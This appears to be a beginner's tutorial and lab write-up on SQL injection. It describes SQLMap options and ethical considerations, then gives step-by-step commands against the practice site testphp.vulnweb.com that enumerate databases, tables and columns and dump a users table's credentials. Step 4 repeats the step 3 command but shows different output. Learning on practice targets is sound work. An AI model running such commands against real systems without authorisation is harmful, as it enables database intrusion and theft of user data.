SQL Injection is a code injection technique where malicious SQL statements are inserted into input fields
allowing an attacker interact directly with a database. It is one of the most common vulnerabilities found in web applications and can lead to unauthorized access, data breaches,
and even complete system compromise.


![Screenshot_2024-12-10_14_50_39](https://github.com/user-attachments/assets/c73a63da-be5e-48f1-822f-efebd80e2f78)

we are testing in sql map
SQLMap is one of the most popular open-source penetration testing tools specifically designed for automating the process of detecting and exploiting SQL injection vulnerabilities.
which is an automated tool for detecting and exploiting SQL injection vulnerabilities. SQLMap is generally used to test whether a web application is vulnerable to SQL injection and, if so, to exploit those vulnerabilities to extract data from the database.

### How to Use SQLMap to Find Vulnerable Websites

SQLMap itself doesn't find websites on the internet; rather, it is used after you’ve identified a potentially vulnerable site or URL. It automates the process of testing that site for SQL injection vulnerabilities.
Below are the steps you can take to find vulnerable websites (with explicit permission!) and then use SQLMap to test and exploit those vulnerabilities.

### Steps to Use SQLMap for Finding Vulnerable Websites

1. Reconnaissance and Target Identification: 
   The first step is to identify a target that might be vulnerable to SQL injection. This often involves gathering information about the target website.

2. Test the Target for SQL Injection: 
   Once you’ve identified a URL or parameter, you can use SQLMap to test it for SQL injection vulnerabilities.

### 1.Identifying a Target URL or Parameter

Before using SQLMap, you need a URL with a parameter that could be potentially vulnerable to SQL injection. Common parameters to test for vulnerabilities include:

- `id=`
- `user=`
- `page=`
- `product=`
- `category=`



### Key SQLMap Options

- `-u` : Specify the URL to test.
- `--data` : POST request data.
- `--cookie` : Send a cookie with the request.
- `--batch` : Automatically answer all prompts.
- `--dbs` : Enumerate databases.
- `-D` : Specify a database to target.
- `-T` : Specify a table to target.
- `--dump` : Dump data from a table.
- `--technique` : Specify injection techniques (e.g., `T`, `B`, `U`, `E`).
- `--sql-shell` : Open an interactive SQL shell.

Ethical Considerations and Legal Concerns

- **Get Permission**: Never run SQLMap (or any penetration testing tool) against a website without **explicit permission**. This is critical to stay within legal boundaries.
- **Bug Bounty Programs**: If you want to test websites in a legal environment, participate in **bug bounty programs** like those on **HackerOne**, **Bugcrowd**, or **Open Bug Bounty**.
- **Responsible Disclosure**: If you find vulnerabilities during authorized testing, always follow responsible disclosure practices and report the issue to the website's owner or the relevant authority.

how to retrieve data step to one by one
i testing the vulnweb.php website

first i used tool is sql map

1.
sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs

![Screenshot_2024-12-10_15_22_49](https://github.com/user-attachments/assets/2f2f9ea3-2964-4b72-bc21-6fb2c9c5e2e6)
1.we find data retrive from a database











[*] acuart
[*] information_schema
2.
sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
![Screenshot_2024-12-10_15_22_49](https://github.com/user-attachments/assets/2f2f9ea3-2964-4b72-bc21-6fb2c9c5e2e6)
Database: acuart
[8 tables]







+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

3.
sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -columns
![Screenshot_2024-12-10_15_32_48](https://github.com/user-attachments/assets/91e8900b-5610-4612-a1b9-49e7e4fa39bf)



Database: acuart
Table: users
[8 columns]







+---------+--------------+
| Column  | Type         |
+---------+--------------+
| name    | varchar(100) |
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+

4.
sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -columns

![Screenshot_2024-12-10_16_13_32](https://github.com/user-attachments/assets/6c0f4464-2923-400d-b693-390f57d3a989)


Database: acuart
Table: users
[1 entry]






+-------+--------+------+----------+
| uname | name   | pass | address  |
+-------+--------+------+----------+
| test  | 1      | test | Me cawen |
+-------+--------+------+----------+
